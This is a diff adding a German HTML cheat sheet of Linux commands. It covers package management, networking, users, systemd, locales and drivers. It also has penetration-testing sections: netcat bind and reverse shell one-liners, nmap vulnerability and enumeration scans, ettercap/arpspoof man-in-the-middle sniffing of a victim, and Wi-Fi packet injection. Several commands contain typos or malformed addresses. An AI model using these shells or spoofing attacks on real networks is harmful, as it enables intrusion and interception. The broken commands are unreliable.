@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="de">
+    <head><meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script src="https://kit.fontawesome.com/b069149807.js" crossorigin="anonymous"></script>
+        <title>Linux</title>
+    </head>
+    <body>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: sans-serif;
+                background-color: #232933;
+            }
+            div {
+                border: 1px solid #494949;
+                margin: 10px;
+                background-color: #15171c;
+            }
+            .container {
+                display: flex;
+                flex-direction: column;
+                flex-wrap: wrap;
+            }
+            .container .ueberschrift-box h1, h2 {
+                text-align: center;
+                color: 	#df1c1c;
+            }
+            .box {
+                background-color: #15171c;
+            }
+            .box h2 {
+                font-weight: 600;
+                font-style: italic;
+                color: #297ae3;
+                margin-left: 3px;
+            }
+            .box h3 {
+                font-weight: 600;
+                font-style: italic;
+                color: #297ae3;
+                margin-left: 4px;
+            }
+            .box p {
+                margin-left: 7px;
+                color: #b3b4b6;
+            }
+            @media (max-width: 480px) {
+                .container .ueberschrift-box h1, h2{
+                    font-size: 6vw;
+                }
+                .box h2, h3 {
+                    font-size: 5vw;
+                }
+                .box p {
+                    font-size: 4vw;
+                }
+            }
+        </style>
+        <div class="container">
+            <div class="ueberschrift-box">
+                <h1>Linux Kommandos</h1>
+                <h2>Linux Kommandos werden teilweise mit root-Rechten ausgefuehrt</h2>
+            </div>
+            <div class="box">
+                <h2>Wichtige Verzeichnise</h2>
+                <p>/lib/modules/kernelversion/kernel/drivers/</p>
+            </div>
+
+            <div class="box box1">
+                <h2>Paket Verwaltung apt</h2>
+                <p>apt update</p>
+                <p>apt upgrade</p>
+                <p>apt dist-upgrade</p>
+                <h3>Paket deinstallieren</h3>
+                <p>apt autoremove Paketname</p>
+                <h3>Paket mit Konfigurationsdateien deinstallieren</h3>
+                <p>apt purge Paketname</p>
+                <h3>Paket Cache leeren /var/cache/apt/archives/</h3>
+                <p>apt autoclean - Pakete, die nicht mehr in den Quellen verfuegbar sind, werden geloescht</p>
+                <p>apt clean - Entfernen von zur Installation heruntergeladenen Paketen</p>
+                <h3>Paket ausschliessen</h3>
+                <p>z.B. apt-mark hold linux-headers-5.4.0-kali-amd64</p>
+                <p>z.B. apt-mark unhold linux-headers-5.4.0-kali-amd64</p>
+                <h3>Paket nach Suchbegriff suchen</h3>
+                <p>z.B. apt search linux-headers-5.4</p>
+                <h3>Installierte Pakete nach Suchmuster suchen</h3>
+                <p>z.B. apt list --installed linux-image*</p>
+            </div>
+
+            <div class="box box2">
+                <h2>Windows Laufwerk mounten</h2>
+                <p>Auf dem Windows-System muss ein Laufwerk freigegeben sein!</p>
+                <p>Verzeichnis auf dem Linux System anlegen</p>
+                <p>z.B. mkdir /mnt/windows</p>
+                <p>mount -t cifs //Windows-System/Freigabe /mnt/windows -o username=test,passwd=test</p>
+                <p>z.B. mount -t cifs //192.168.55.21/test /mnt/windows -o username=test,passwd=test</p>
+            </div>
+
+            <div class="box box3">
+                <h2>Verzeichnisse und Dateien</h2>
+                <h3>Setzt Inhaber user und group für verzeichnis</h3>
+                <p>chmod -R user:group Verzeichnis</p>
+                <h3>Verzeichnis / Dateien suchen</h3>
+                <p>find /Pfad - name Verzeichnis/Dateiname</p>
+                <h3>Dateien mit bestimmten Suchmuster suchen</h3>
+                <p>find /Pfad -type f -exec grep -l "Suchmuster" {} \;</p>
+                <h3>Dateien nach Groesse suchen</h3>
+                <p>ls -la --block-size=M</p>
+                <p>find /Pfad -type f -size +50000k -exec ls -l --block-size=M {} \;</p>
+            </div>
+
+            <div class="box box4">
+                <h2>Benutzer verwalten</h2>
+                <h3>Benutzer mit Home Shell erstellen, kopiert Inhalt von /etc/skel</h3>
+                <p>useradd -m -s /bin/bash user</p>
+                <h3>Benutzer inkl. Home- und Mailverzeichnis loeschen</h3>
+                <p>userdel -r user</p>
+                <h3>Benutzerinformationen anzeigen</h3>
+                <p>id user</p>
+                <h3>Benutzer einer zusätzlichen Gruppe zuweisen</h3>
+                <p>usermod -G group user</p>
+                <h3>Alle Gruppen eines Benutzers anzeigen</h3>
+                <p>groups user</p>
+            </div>
+
+            <div class="box box5">
+                <h2>Enable Monitor Mode TP-Link W722N v2/v3 Kernel 5.4</h2>
+                <hr>
+                <h3>[Download und Installation]</h3>
+                <p>sudo apt update</p>
+                <p>sudo apt upgrade</p>
+                <p>sudo apt install bc</p>
+                <p>sudo rmmod r8188eu.ko</p>
+                <p>git close https://github.com(aircrack-ng/rtl8188eus</p>
+                <p>cd rtl8188eus</p>
+                <p>sudo -i</p>
+                <p>echo "blacklist r8188eu.ko" > "/etc/modprobe.d/realteck.conf</p>
+                <p>exit</p>
+                <p>make</p>
+                <p>sudo make install</p>
+                <p>sudo modprobe 8188eu</p>
+                <h3>[Enable Monitor Mode]</h3>
+                <p>sudo airmon-ng check kill</p>
+                <p>sudo ip link set wlan0 down</p>
+                <p>sudo iw dev wlan0 set type monitor</p>
+                <h3>[Testen Packet Injection]</h3>
+                <p>aireplay-ng --test wlan0</p>
+                <p>sudo aireplay-ng -9 wlan0</p>
+            </div>
+            
+            <div class="box box6">
+                <h2>Enable Momitor Mode UPDATE 04/2021</h2>
+                <p>sudo apt update</p>
+                <p>sudo apt upgrade</p>
+                <p>sudo apt install bc</p>
+                <p>sudo apt install build-essential</p>
+                <p>sudo apt install libelf-dev</p>
+                <h3>Versuche eines dieser Kommandos</h3>
+                <p>sudo apt install linux-headers$("uname -r")</p>
+                <p>sudo apt-get install linux-headers-5.10.0-kali6-amd64</p>
+                <hr>
+                <p>sudo apt install dkms</p>
+                <p>sudo rmmod r8188eu.ko</p>
+                <p>git clone https://github.com/aircrack-ng/rtl8188eus</p>
+                <p>cd rtl8188eus</p>
+                <p>sudo -i</p>
+                <p>echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"</p>
+                <p>exit</p>
+                <p>reboot</p>
+                <p>sudo apt update</p>
+                <p>cd rtl8188eus</p>
+                <p>sudo make</p>
+                <p>sudo make install</p>
+                <p>sudo modprobe 8188eu</p>
+                <h3>Enable Monitor Mode and test Packet-Injection</h3>
+                <p>sudo ifconfig wlan0 down</p>
+                <p>sudo airmon-ng check kill</p>
+                <p>sudo iwconfig wlan0 mode monitor</p>
+                <p>sudo ifconfig wlan0 up</p>
+                <p>iwconfig</p>
+                <p>sudo aireplay-ng --test wlan0</p>
+            </div>
+
+            <div class="box box7">
+                <h2>NetworkManager</h2>
+                <h3>Wifi-Verbindung manuell anlegen</h3>
+                <p>nmcli radio all</p>
+                <p>nmcli device wifi list</p>
+                <p>sudo nmcli device wifi connection ssid ifname wlan0 password 123456789</p>
+                <p>sudo nmcli connection modify ssid ipv6.ip6-privacy 2</p>
+                <p>sudo nmcli connection down ssid</p>
+                <p>sudo nmcli connection up ssid</p>
+                <p>nmcli -p device show wlan0</p>
+                <p>sudo cat /etc/NetworkManager/system-connections/ssid</p>
+                <p>sudo cat /etc/resolv.conf</p>
+                <p>sudo nmcli connection modify ssid ipv6.dns "2606:4700:4700:1111,2606:4700:4700:1001"</p>
+                <p>sudo nmcli connection down ssid</p>
+                <p>sudo nmcli connection up ssid</p>
+                <p>nmcli -p device show wlan0</p>
+                <p>sudo nmcli connection modify ssid ipv6.ignore-auto-dns yes</p>
+                <p>sudo nmcli connection modify ssid ipv6.dns-priority 3</p>
+                <p>sudo nmcli connection down ssid</p>
+                <p>sudo nmcli connection up ssid</p>
+                <p>nmcli -p device show wlan0</p>
+                <h3>Statische IP-Adresse anlegen</h3>
+                <p>nmcli connection show</p>
+                <p>sudo nmcli connection modify UUID IPv4.address 192.168.55.123/24</p>
+                <p>sudo nmcli connection modify UUID IPv4.gateway 192.168.55.1</p>
+                <p>sudo nmcli connection modify UUID IPv4.dns "8.8.8.8,8.8.4.4"</p>
+                <p>sudo nmcli connection modify UUID IPv4.method manuel</p>
+                <p>sudo nmcli connection down UUID</p>
+                <p>sudo nmcli connection up UUID</p>
+                <h3>Netzwerk Adapter Status anzeigen</h3>
+                <p>nmcli device status</p>
+                <h3>Verfuegbare Wi-Fi Netzwerk anzeigen</h3>
+                <p>nmcli device wifi list</p>
+                <h3>Mit einem Wi-Fi Netzwerk verbinden</h3>
+                <p>nmcli device wifi connect "$SSID" password "$PASSWORD"</p>
+                <h3>DNS-Server hinzufuegen oder entfernen</h3>
+                <p>nmcli connection modify +ipv4.dns 1.1.1.1</p>
+                <p>nmcli connection modify -ipv4.dns 1.1.1.1</p>
+            </div>
+
+            <div class="box box8">
+                <h2>Netzwerk ipv4</h2>
+                <h3>Hardware Adressen anzeigen</h3>
+                <p>arp -a</p>
+                <p>ip neigh show</p>
+                <h3>IP-Adresse anzeigen</h3>
+                <p>ip addr show</p>
+                <h3>IP-Adresse entfernen</h3>
+                <p>ip addr delete 192.168.55.11/24 dev eth0</p>
+                <h3>IP-Adresse manuell vergeben</h3>
+                <p>ip addr add 192.168.55.11/24 dev eth0</p>
+                <h3>Default Gateway IP-Adresse anzeigen</h3>
+                <p>ip route show</p>
+                <h3>Gateway IP-Adresse entfernen</h3>
+                <p>ip route del default via 192.168.0.1 dev wlan0</p>
+                <h3>Gateway IP-Adresse manuel vergeben</h3>
+                <p>ip route add default via 192.168.0.1 dev wlan0</p>
+                <h3>Netzwerk Troubleshooting</h3>
+                <p>ping -c4 192.168.0.1</p>
+                <p>traceroute www.google.de</p>
+                <p>mtr -c4 -w -r www.google.de</p>
+                <h3>Aktive Verbindungen anzeigen</h3>
+                <p>ss -tlpn</p>
+                <p>netstat -tlpn</p>
+            </div>
+
+            <div class="box box9">
+                <h2>Netzwerk ipv6</h2>
+                <h3>Hardware Adressen anzeigen</h3>
+                <p>ip -6 neigh show</p>
+                <h3>IP-Adresse anzeigen</h3>
+                <p>ip -6 addr show</p>
+                <p>ping6 -I wlan0 -c2 ff02::1</p>
+                <p>traceroute -6 www.google.de</p>
+                <p>mtr -6 -c4 -w -r www.google.de</p>
+                <h3>Aktive Verbindungen anzeigen</h3>
+                <p>ss -tlpn</p>
+                <p>netstat -tlpn</p>
+            </div>
+
+            <div class="box box10">
+                <h2>Netcat Befehle</h2>
+                <h3>Bind-Shell</h3>
+                <p>Kali = ncat Windows-IP 4444</p>
+                <p>Windows = nc -nlvp 4444 -e cmd.exe</p>
+                <h3>Reverse-Shell</h3>
+                <p>Server z.B.Kali = ncat -nlvp 443</p>
+                <p>Client z.B.Windows = nc -nv Kali-server -e cmd.exe</p>
+            </div>
+
+            <div class="box box11">
+                <h2>NMAP Befehle</h2>
+                <h3>Verzeichnis /usr/share/nmap</h3>
+                <h3>Host discovery / Ping Scan</h3>
+                <p>nmap -sn 192.168.55.55 oder 192.168.55.0/24</p>
+                <p>Wenn ICMP von der Zielsystem Firewall blockiert wird (ping)</p>
+                <p>Kein PING zum scannen des Zielsystems benutzen</p>
+                <p>Ohne Portscan immer -sn hinzufuegen! und mit sudo!</p>
+                <p>nmap -Pn 192.168.55.55</p>
+                <p>ARP-Scan</p>
+                <p>nmap -PR -sn 192.168.55.55 oder arp scan 192.168.55.55</p>
+                <p>nmap -PE -sn 192.168.55.55</p>
+                <p>nmap -PP -sn 192.168.55.55</p>
+                <p>nmap -PM -sn 192.168.55.55</p>
+                <h3>Syn Stealth Scan</h3>
+                <p>nmap -sS 192.168.55.55</p>
+                <p>nmap -sS -p21,22,23,80,139,443,445 192.168.55.55 -vv --reason</p>
+                <h3>Connect Scan</h3>
+                <p>nmap -sT 192.168.55.55</p>
+                <h3>Komplexere Befehle</h3>
+                <p>nmap -T4 -sS -sV -O 192.168.55.55 -vv --reason</p>
+                <p>nmap -sV 192.168.0.55.55 --script vuln -vv</p>
+                <p>nmap -T4 -sS -sV -p- 192.168.0.55.55 --script vuln</p>
+                <p>nmap -p139,445 --script "smb-enmu" 192.168.55.55</p>
+                <p>nmap -Pn -sS -sV -A -p- 192.168.0.55.55 --script vuln</p>
+                <h3>SMTP Enumeration</h3>
+                <p>nmap -p25 --script smtp-enum-users.nse 192.168.55.55</p>
+            </div>
+
+            <div class="box box12">
+                <h2>ManInTheMiddle</h2>
+                <h3>Ettercap</h3>
+                <p>sudo ettercap -T -S -i wlan0 -M arp:remote /Router// /IP-Target//</p>
+                <p>sudo ettercap -T -S -i wlan0 -M arp:remote /192.168.55.55// /192.168.55.55//</p>
+                <h3>Mit Wireshark tshark oder tcpdump auswerten</h3>
+                <p>tcpdump -i eth0 host 192.168.0.55.55 and port 443 -w test.pcap</p>
+                <p>tcpdump -r test.pcap</p>
+                <p>tshark -i eth0 -f "host 192.168.55.55" -f "tcp port 443" -w test.pcap</p>
+                <p>tshark -r test.pcap</p>
+                <h3>Mit arpspoof aus dem Paket dsniff</h3>
+                <h3>Enable Portforwarding</h3>
+                <p>sysctl -w net.ipv4.ip_forward=1</p>
+                <h3>Spoof Connection zwischen Victim und Router</h3>
+                <h3>Neues Terminal und laufen lassen</h3>
+                <p>arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]</p>
+                <h3>Neues Terminal und laufen lassen</h3>
+                <p>arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]</p>
+                <h3>Neues Terminal URL Verkehr auf dem Victim sniffen</h3>
+                <p>urlsnarf -i eth0</p>
+                <h3>Disable Portforwarding</h3>
+                <p>sysctl -w net.ipv4.ip_forward=0</p>
+            </div>
+
+            <div class="box box13">
+                <h2>Systemd</h2>
+                <h3>systemd Dienst status anzeigen</h3>
+                <p>systemctl status application.service</p>
+                <h3>systemd Dienst starten</h3>
+                <p>systemctl start application.service</p>
+                <h3>systemd Dienst stoppen</h3>
+                <p>systemctl stop application.service</p>
+                <h3>systemd Dienst restart oder reload</h3>
+                <p>systemctl restart/reload application.service</p>
+                <h3>systemd Dienst beim booten starten oder nicht mehr starten</h3>
+                <p>systemctl enable application.service</p>
+                <p>systemctl disable application.service</p>
+            </div>
+
+            <div class="box box14">
+                <h2>Zeit und Datum</h2>
+                <h3>Wichtige Dateien</h3>
+                <p>/usr/share/zoneinfo</p>
+                <h3>Zeit, Datum, Zeitzone abfragen</h3>
+                <p>timedatectl status</p>
+                <h3>Zeitzonen anzeigen</h3>
+                <p>timedatectl list-timezones | grep -i berlin</p>
+                <h3>Manuelle Einstellungen LOCALES</h3>
+                <h3>Momentane LOCALES Einstellungen anzeigen</h3>
+                <p>locale</p>
+                <h3>Was ist vorhanden</h3>
+                <p>locale -a</p>
+                <h3>Neue Sprache hinzufuegen oder auskommentieren</h3>
+                <p>sudo nano /etc/locale.gen</p>
+                <p>sudo locale.gen</p>
+                <h3>Sprache permanet fuer einen User aendern</h3>
+                <p>export LANG=en_US.utf-8 /home/user/.bashrc</p>
+                <h3>Systemweite Default Sprache aendern</h3>
+                <p>sudo localectl set-locale LANG=de_DE.utf-8</p>
+                <h3>Alle verfuegbaren LOCALES anzeigen</h3>
+                <p>cat /usr/share/i18n/SUPPORTED</p>
+                <p>grep "de" /usr/share/i18n/SUPPORTED</p>
+                <p>dpkg-reconfigure locales</p>
+            </div>
+
+            <div class="box box15">
+                <h2>Treiber und Module</h2>
+                <h3>Moeglichkeiten zur Anzeige der Konfiguration</h3>
+                <h3>z.B. USB Wifi-Adapter</h3>
+                <p>hwinfo -wlan</p>
+                <p>lshw -C network</p>
+                <p>lsusb -t</p>
+                <h3>PCI-Express Treiber</h3>
+                <p>lspci</p>
+                <p>lspci -s 02:00.0 -k</p>
+                <h3>Information ueber Kernel-Module (Treiber)</h3>
+                <p>modinfo r8188eu</p>
+            </div>
+
+        </div>
+    </body>
+</html>
